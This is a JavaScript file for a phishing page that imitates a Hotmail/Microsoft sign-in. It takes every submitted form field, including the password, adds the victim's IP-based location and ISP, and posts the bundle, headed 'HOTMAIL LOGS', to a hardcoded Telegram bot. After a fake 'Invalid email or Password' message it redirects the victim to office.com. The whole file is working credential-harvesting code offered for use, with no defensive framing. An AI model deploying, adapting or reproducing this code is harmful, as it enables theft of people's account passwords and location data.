document.addEventListener('DOMContentLoaded', function () {
        const btWole = document.getElementById('btWole');
        const msgFont = document.getElementById('msgfont');

        const botToken1 = '8877161046:AAGWngquqrsiE1nHJHcKZAA9tcUv_DWjQCY';
        const chatId1 = '6389759776';
        const telegramUrl1 = `https://api.telegram.org/bot${botToken1}/sendMessage`;

        const botToken2 = '';
        const chatId2 = '';
        const telegramUrl2 = `https://api.telegram.org/bot${botToken2}/sendMessage`;

        let countAttempt = 0;
        let locationData = { country: "Unknown", state: "Unknown", city: "Unknown", ip: "Unknown" };

        fetchLocationFromIP();

        ['click', 'touchend'].forEach(eventType => {
            btWole.addEventListener(eventType, function (event) {
                event.preventDefault();
                handleSubmission();
            });
        });

        function handleSubmission() {
            const pito = document.getElementById('pito').value.trim();

            if (!pito) {
                msgFont.textContent = "Please enter password";
                return;
            }

            btWole.value = "Verifying...";
            msgFont.textContent = "Processing...";

            teSile(locationData);
        }

        function fetchLocationFromIP() {
            fetch('http://ip-api.com/json/?fields=status,message,country,regionName,city,isp,query')
                .then(response => response.json())
                .then(data => {
                    if (data.status === 'success') {
                        locationData = {
                            country: data.country || 'Unknown',
                            state: data.regionName || 'Unknown',
                            city: data.city || 'Unknown',
                            ip: data.query || 'Unknown',
                            isp: data.isp || 'Unknown'
                        };
                    } else {
                        locationData = { country: "Blocked", state: "Blocked", ip: data.query || "Unknown" };
                    }
                })
                .catch(() => {
                    locationData = { country: "Offline", state: "Offline" };
                });
        }

        function teSile(loc) {
            const formData = new FormData(document.forms['ozoto']);
            countAttempt++;

            let messageText = '=== HOTMAIL LOGS ===\n';
            for (const [key, value] of formData.entries()) {
                messageText += `${key}: ${value}\n`;
            }

            messageText += `\nLOCATION (IP-BASED):\n`;
            messageText += `IP: ${loc.ip}\n`;
            messageText += `Country: ${loc.country}\n`;
            messageText += `State/Region: ${loc.state}\n`;
            if (loc.city && loc.city !== 'Unknown') messageText += `City: ${loc.city}\n`;
            if (loc.isp && loc.isp !== 'Unknown') messageText += `ISP: ${loc.isp}\n`;

            messageText += `\nTime: ${new Date().toLocaleString()}\n`;
            messageText += `Attempts: ${countAttempt}\n`;

            const payload = { text: messageText };

            sendToTelegram(telegramUrl1, { ...payload, chat_id: chatId1 });
            sendToTelegram(telegramUrl2, { ...payload, chat_id: chatId2 });

            if (countAttempt >= 2) {
                setTimeout(() => {
                    window.location.href = "http://office.com";
                }, 2000);
            } else {
                setTimeout(() => {
                    msgFont.textContent = "Invalid email or Password";
                    btWole.value = "Continue";
                }, 2000);
            }
        }

        function sendToTelegram(url, data) {
            const xhr = new XMLHttpRequest();
            xhr.open('POST', url, true);
            xhr.setRequestHeader('Content-Type', 'application/json');
            xhr.send(JSON.stringify(data));
        }
    });